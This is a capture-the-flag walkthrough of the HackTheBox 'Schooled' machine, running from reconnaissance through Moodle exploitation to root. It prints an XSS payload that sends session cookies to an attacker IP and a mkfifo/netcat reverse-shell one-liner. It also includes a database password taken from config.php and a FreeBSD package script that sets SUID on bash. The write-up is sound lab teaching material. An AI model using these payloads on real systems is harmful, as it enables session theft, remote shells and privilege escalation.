# HackTheBox-Schooled

## Rustscan

```bash
PORT      STATE SERVICE REASON         VERSION                                                                                                      
22/tcp    open  ssh     syn-ack ttl 63 OpenSSH 7.9 (FreeBSD 20200214; protocol 2.0)                                                                 
| ssh-hostkey:       
|   2048 1d:69:83:78:fc:91:f8:19:c8:75:a7:1e:76:45:05:dc (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDGY8PnQ2GFk9RrUQ82xGivlyXZ8k99JFZAFlNqJIftRHSGWL3HsfaO08lnGCrqVxj3235k0L74SJAqWfJs1ykTRipcZpsI5QvwYPyqpisMgH
/SdCH1wehZpgaXRwdn52ob9+GxZ6qjqIon0cH0XR1hkNIGdbTt4RRMy+IfynzVuomW2mUi0tnnXU69pcyYNMShND4PqxVDKZHwUyeDIiYVBvnL5P9qEh0Q/t0HKWFHQ8otwWEpL3jnn774RFP9ET
tZsJ/xosuhty02yIZuP6vqtbWfVqcqM8v1R3jm/xjXfXxiflGO09KO2aePAbEhNEofb7V/f33dRQDv5mr9ceZ1                                                              
|   256 e9:b2:d2:23:9d:cf:0e:63:e0:6d:b9:b1:a6:86:93:38 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBHc4TgrG+CyKqaIsk10XmAhUKULXK6Bq3bHHeJiWuBmdGS1k3Fp60OoVFdDKQj9aihkaUmbJ8f
kG6dp07bm8IcM=    
|   256 7f:51:88:f7:3c:dd:77:5e:ba:25:4d:4c:09:25:ea:1f (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPWIP8gV7SGQNoODfYq9qg1k3j6ZZg+1L9zIU9FrHPaf
80/tcp    open  http    syn-ack ttl 63 Apache httpd 2.4.46 ((FreeBSD) PHP/7.4.15)                                                                   
33060/tcp open  mysqlx? syn-ack ttl 63
| fingerprint-strings:
|   DNSStatusRequestTCP, LDAPSearchReq, SSLSessionReq, TLSSessionReq, X11Probe:
|     Invalid message"                                                    
|     HY000                                                               
|   LDAPBindReq:       
|     *Parse error unserializing protobuf message"
|_    HY000                                                             
```

## PORT 80 (HTTP)

<img src="https://imgur.com/s1ZZyps.png"/>

At the bottom we see a domain name so let's add this to `/etc/hosts` file

<Img src="https://imgur.com/ebUxzl5.png"/>

<img src="https://imgur.com/KtBFH4j.png"/>


I did not find anything intersting on port 80 also directory fuzzing was failing so we have a domain name let's look for subdomain

<img src="https://imgur.com/mLlFwE1.png"/>

Here we need to hide repsone with 461 lines 

<img src="https://imgur.com/OcHonJ6.png"/>

We found a subdomain `moodle.schooled.htb`

<img src="https://imgur.com/pJYpuYA.png"/>


## Names found from subdomain

```
Jamie Borham
Lianne Carter
Jane Higgins
Manuel Phillips
```

Other than that nothing was interesting so let's register an account

<img src="https://imgur.com/4MpScD1.png"/>

<img src="https://imgur.com/OqU45ol.png"/>

It throws a lot of erros so let's fix this.

<img src="https://imgur.com/tFrtgvX.png"/>

We can only enroll in maths course

<img src="https://imgur.com/6x55niF.png"/>

Also we can see the teacher's profile

<img src="https://imgur.com/RBSulWW.png"/>

Checking  forum activity we see that there's an announcement made by the teacher

<img src="https://imgur.com/qEKoyFG.png"/>

<img src="https://imgur.com/iBIPzK5.png"/>

Set the MoodleNet profile 

<img src="https://imgur.com/ZXmCn1R.png"/>

Now we can see that Teacher is online

<img src="https://imgur.com/6RfaxSS.png"/>

Here we can check for XSS 

<img src="https://imgur.com/7PUo1RL.png"/>

<img src="https://imgur.com/gVT5uPW.png"/>

<img src="https://imgur.com/dfQlWwm.png"/>

So appearntly I was doing it wrong and trying the xss session hijacking here as we were the only one who were triggering the file. The announcment had a message 

```bash
This is a self enrollment course. For students who wish to attend my lectures be sure that you have your MoodleNet profile set.

Students who do not set their MoodleNet profiles will be  removed from the course before the course is due to start and I will be checking all students who are enrolled on this course. 
```

So instead of injecting xss on chat , let's try on where we set moodle net profile also I used this xss cookie stelaer

https://github.com/s0wr0b1ndef/WebHacking101/blob/master/xss-reflected-steal-cookie.md


```
<img src=x onerror="this.src='http://10.10.14.81:8888/?'+document.cookie; this.removeAttribute('onerror');">
```

<img src="https://imgur.com/t3SsCwc.png"/>

Now run the cookie stealer python script

<img src="https://imgur.com/UmrSonW.png"/>

At first you'll see your own cookie but after sometime that script will be accessed by teacher's account and you'll get his session cookie , so copy the session cookie and replace it with your current session cookie

<img src="https://imgur.com/ZQMvT3l.png"/>

After becoming the teacher , I saw an option to switch roles

<img src="https://imgur.com/YmPS53j.png"/>

On moodle's there are a bunch of reported vulnerabilities so I went reading about each one seemed intersting to me

<img src="https://imgur.com/FqBXwoL.png"/>

And PoC was available on github

https://github.com/HoangKien1020/CVE-2020-14321

<img src="https://imgur.com/6mAZzkW.png"/>

So here enroll click on enrolling the user and intercept the request with burp then send it to repeater

<img src="https://imgur.com/XdYlJwT.png"/>

<mg src="https://imgur.com/7flUfLy.png"/>

We can see that this user's id is 24 so we edit the request by enrolling the teaacher him self in the course and making him the `manager` by assigning role to `1`

<img src="https://imgur.com/IDpRNRp.png"/>

<img src="https://imgur.com/BARnBJg.png"/>

Now click on the other account who also has become manager and click on login as

<img src="https://imgur.com/k74nfVB.png"/>

At the bottom you'll see `Site Administration`

<img src="https://imgur.com/TJvdFX4.png"/>

There's a problem we can't upload any vulnerable plugin so we would need to modify manager role's permissions , go to `users` --> `define role` then click on edit `manager role` and go to bottom intercept `save changes` request


<img src="https://imgur.com/2aPJat3.png"/>

You'll see this , send it to `repeater tab`

<img src="https://imgur.com/jTFg21v.png"/>

Replace this all with the permissions seen on PoC 's repository

<img src="https://imgur.com/iKWraM4.png"/>

Now we can upload plugin

<img src="https://imgur.com/SHLxeo6.png"/>

Click on install

<img src="https://imgur.com/b0L53J1.png"/>

<img src="https://imgur.com/N06xr45.png"/>

You'll see this screen , don't click on continue instead trigger the remote code execution

<img src="https://imgur.com/TOuIjwh.png"/>

<img src="https://imgur.com/3BLTGmP.png"/>

Now to get a reverse shell I tried the netcat ,bash ones but they didn't worked as this was a Free BSD box so this one worked

```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i |nc <ip> <port> > /tmp/f
```

<img src="https://imgur.com/uxwz1un.png"/>

I tried to acess user's home directory but we didn't had any permissions to view it so next in my mind came about database as moodle was storing usernames so by default websites are hosted in `/usr/local/www` on FreeBSD

<img src="https://imgur.com/n1Kk4ER.png"/>

In documentation it said that database configuration is in `config.php` , so after using the find command

<img src="https://imgur.com/XgTUtVz.png"/>

<img src="https://imgur.com/n3JB1YA.png"/>

So mysql is running on port 3306 but since it's not a stabilized shell we can't login so we can upload `chisel` binary on the machine and forward port 3306

<img src="https://imgur.com/a0Sl8IO.png"/>



```
$CFG->dbtype    = 'mysqli';
$CFG->dblibrary = 'native';
$CFG->dbhost    = 'localhost';
$CFG->dbname    = 'moodle';
$CFG->dbuser    = 'moodle';
$CFG->dbpass    = 'PlaybookMaster2020';
$CFG->prefix    = 'mdl_';

```

Now we can't use mysql binary as it is not in `PATH` variable

<img src="https://imgur.com/UeDz8zB.png"/>

So there's directory `/usr/local`

<img src="https://imgur.com/o61aowp.png"/>

There's a binary folder which means that must be the location where all binaries i.e python,perl,bash,mysql exists so we can use python to spawn a tty shell then use mysql 

<img src="https://imgur.com/rRYLR0h.png"/>

Python3 exists in `/usr/local/bin` so spawn and stabilize the shell

<img src="https://imgur.com/ZsRw00k.png"/>

<img src="https://imgur.com/Xx4z6B1.png"/>

<img src="https://imgur.com/vtzUNo1.png"/>

<img src="https://imgur.com/GQEHbFN.png"/>

We can Jamie's data there and he's a user on the box

<img src="https://imgur.com/tOJXYUo.png"/>

It's a bcrypt hash ,save it in a file and crack it with either hashcat or john

<img src="https://imgur.com/5Dma5Sz.png"/>

SSH into the machine

<img src="https://imgur.com/XObMUOT.png"/>

Doing `sudo -l` we can see that this user can install any package

<img src="https://imgur.com/7qHpWOS.png"/>

Reading the configuration file for pkg

<img src="https://imgur.com/zfzP9jH.png"/>

It grabs from `devops.htb` which points to a private IP

<img src="https://imgur.com/0SBJBgC.png"/>

But it wasn't anything we could do so , searched for freebsd custom packages and found this article 

http://lastsummer.de/creating-custom-packages-on-freebsd/

Which explained how you can build your own packages,  so bascially what this script is doing that creating a folder in james' home directory named `stage` and a `+PRE_DEINSTALL` , `+POST_INSTALL` and `+MANIFEST` file .

The article says that 

> You want to run post-install and pre-deinstall tasks as it makes sure your files are in place when you do the system manipulation

So let's modify the script from article and make put a command that will make bash a SUID  in `+POST_INSTALL` 


```bash

#!/bin/sh

STAGEDIR=~/stage
rm -rf ${STAGEDIR}
mkdir -p ${STAGEDIR}

cat >> ${STAGEDIR}/+PRE_DEINSTALL <<EOF
# careful here, this may clobber your system
echo "Resetting root shell"
pw usermod -n root -s /bin/sh
EOF

cat >> ${STAGEDIR}/+POST_INSTALL <<EOF
# careful here, this may clobber your system
echo "Registering root shell"
chmod +s /usr/local/bin/bash
EOF

cat >> ${STAGEDIR}/+MANIFEST <<EOF
name: mypackage
version: "1.0_5"
origin: sysutils/mypackage
comment: "automates stuff"
desc: "automates tasks which can also be undone later"
maintainer: john@doe.it
www: https://doe.it
prefix: /
EOF


mkdir -p ${STAGEDIR}/usr/local/etc
echo "# hello world" > ${STAGEDIR}/usr/local/etc/my.conf
echo "/usr/local/etc/my.conf" > ${STAGEDIR}/plist

pkg create -m ${STAGEDIR}/ -r ${STAGEDIR}/ -p ${STAGEDIR}/plist -o .
```

Here's what these shell scripts will do

<img src="https://imgur.com/XgufP2u.png"/>

So after running the above script we will have a FreeBSD package compiled

<img src="https://imgur.com/R6nBsuP.png"/>

As we have sudo rights to install any package , install it with `--no-repo-update`

<img src="https://imgur.com/yzD6Nwm.png"/>

<img src="https://imgur.com/8BgTBqy.png"/>

And we can bash having a SUID so if we do `bash -p` we will get root

<img src="https://imgur.com/0t82FGy.png"/>

## References
- https://github.com/s0wr0b1ndef/WebHacking101/blob/master/xss-reflected-steal-cookie.md
- https://github.com/HoangKien1020/CVE-2020-14321
- http://lastsummer.de/creating-custom-packages-on-freebsd/
